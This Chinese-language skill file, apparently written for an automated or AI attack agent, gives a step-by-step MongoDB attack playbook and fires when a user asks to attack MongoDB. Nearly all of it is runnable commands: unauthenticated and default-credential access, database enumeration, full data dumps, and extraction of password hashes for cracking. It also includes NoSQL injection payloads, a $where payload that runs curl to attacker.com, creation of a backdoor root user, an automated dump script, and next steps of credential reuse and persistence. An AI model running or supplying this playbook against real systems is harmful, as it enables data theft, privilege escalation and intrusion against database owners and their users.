---
name: mongodb-attack
type: attack
category: database
platform: mongodb
severity: high
---

# MongoDB 攻击技能

## 触发条件

- 发现 MongoDB 实例
- 可以访问 MongoDB
- 用户要求"攻击 MongoDB"

## 前置检查

```bash
# 1. 测试连接
mongosh --host mongodb.example.com --port 27017

# 2. 检查版本
mongosh --host mongodb.example.com --port 27017 --eval "db.version()"

# 3. 列出数据库
mongosh --host mongodb.example.com --port 27017 --eval "show dbs"
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 尝试无认证连接
mongosh --host mongodb.example.com --port 27017

# 2. 测试默认凭证
# MongoDB 旧版本默认无认证
# 常见默认: admin/admin, root/root
mongosh --host mongodb.example.com --port 27017 -u admin -p admin

# 3. 扫描 MongoDB
nmap -p 27017 --script mongodb-info TARGET_IP
```

### 方法 2: 数据库枚举

```bash
# 1. 列出所有数据库
mongosh --host mongodb.example.com --port 27017 --eval "db.getMongo().getDBNames()"

# 2. 切换数据库
mongosh --host mongodb.example.com --port 27017 --eval "use database_name"

# 3. 列出集合
mongosh --host mongodb.example.com --port 27017 --eval "use database_name; show collections"

# 4. 获取集合统计
mongosh --host mongodb.example.com --port 27017 --eval "use database_name; db.collection.stats()"
```

### 方法 3: 数据窃取

```bash
# 1. 读取所有文档
mongosh --host mongodb.example.com --port 27017 --eval "use database_name; db.collection.find().forEach(printjson)"

# 2. 搜索敏感字段
mongosh --host mongodb.example.com --port 27017 --eval "use database_name; db.collection.find({password: {\$exists: true}})"

# 3. 导出所有数据
mongodump --host mongodb.example.com --port 27017 --out /tmp/mongodb-dump

# 4. 导出特定集合
mongodump --host mongodb.example.com --port 27017 -d database_name -c collection_name --out /tmp/dump
```

### 方法 4: 用户凭证窃取

```bash
# 1. 访问 admin 数据库
mongosh --host mongodb.example.com --port 27017 --eval "use admin"

# 2. 列出所有用户
mongosh --host mongodb.example.com --port 27017 --eval "use admin; db.system.users.find().forEach(printjson)"

# 3. 获取用户角色
mongosh --host mongodb.example.com --port 27017 --eval "use admin; db.getUsers()"

# 4. 提取密码哈希（可用于离线破解）
mongosh --host mongodb.example.com --port 27017 --eval "use admin; db.system.users.find({}, {user: 1, credentials: 1})"
```

### 方法 5: NoSQL 注入

```bash
# 1. 绕过认证
# 在 JSON 对象中使用 $ne
db.users.find({username: {$ne: null}, password: {$ne: null}})

# 2. 提取数据（盲注）
db.users.find({$where: "this.username == 'admin' || this.password == 'password'"})

# 3. 通过正则提取
db.users.find({username: {$regex: "a.*"}})

# 4. 时间盲注
db.users.find({$where: "sleep(10000)"})
```

### 方法 6: JavaScript 执行

```bash
# 1. 使用 $where 执行代码
db.collection.find({$where: "function() { return this.password == 'secret'; }"})

# 2. 执行系统命令（旧版本）
db.collection.find({$where: "function() { require('child_process').exec('curl attacker.com'); return true; }"})

# 3. 通过 mapReduce 执行代码
db.collection.mapReduce(function() { emit(this._id, 1); }, function(k, v) { return Array.sum(v); }, { out: 'result' })

# 4. 使用 eval（MongoDB < 4.2）
db.eval("print('malicious code')")
```

### 方法 7: 权限提升

```bash
# 1. 创建管理员用户
db.createUser({
  user: "attacker",
  pwd: "password",
  roles: [{role: "userAdminAnyDatabase", db: "admin"}]
})

# 2. 授予所有权限
db.grantRolesToUser("attacker", [{role: "root", db: "admin"}])

# 3. 修改现有用户权限
db.updateUser("existing_user", {roles: [{role: "root", db: "admin"}]})

# 4. 创建具有所有权限的用户
db.createUser({
  user: "root",
  pwd: "password",
  roles: ["root"]
})
```

### 方法 8: 配置文件利用

```bash
# 1. 如果可以访问服务器文件系统
cat /etc/mongod.conf

# 2. 查找未授权的数据库路径
grep -r "dbPath" /etc/mongod.conf

# 3. 访问数据文件
# MongoDB 数据文件通常在 /var/lib/mongodb

# 4. 查看日志
tail -f /var/log/mongodb/mongod.log
```

### 方法 9: GridFS 利用

```bash
# 1. 列出 GridFS 集合
show collections
# 通常有 fs.files 和 fs.chunks

# 2. 查看存储的文件
db.fs.files.find().forEach(printjson)

# 3. 下载文件
mongofiles --host mongodb.example.com --port 27017 get filename

# 4. 列出所有文件
mongofiles --host mongodb.example.com --port 27017 list
```

### 方法 10: 自动化攻击

```bash
# 1. 自动化数据导出脚本
cat > mongodb_dump.sh <<'EOF'
#!/bin/bash
host=$1
port=$2
output_dir="/tmp/mongodb_dump_$(date +%s)"

mkdir -p $output_dir

# 列出所有数据库
databases=$(mongosh --host $host --port $port --quiet --eval "db.getMongo().getDBNames()")

# 导出每个数据库
for db in $databases; do
  echo "Dumping database: $db"
  mongodump --host $host --port $port -d $db --out $output_dir
done

echo "Dump saved to: $output_dir"
EOF

chmod +x mongodb_dump.sh
./mongodb_dump.sh mongodb.example.com 27017
```

## 验证成功

```bash
# 成功连接
mongosh --host mongodb.example.com --port 27017

# 成功列出数据库
mongosh --host mongodb.example.com --port 27017 --eval "show dbs"

# 成功读取数据
mongosh --host mongodb.example.com --port 27017 --eval "use database_name; db.collection.find().forEach(printjson)"
```

## 下一步

1. 分析窃取的数据中的敏感信息
2. 使用发现的凭证访问其他系统
3. 通过 MongoDB 建立持久化
4. 攻击使用 MongoDB 的应用程序
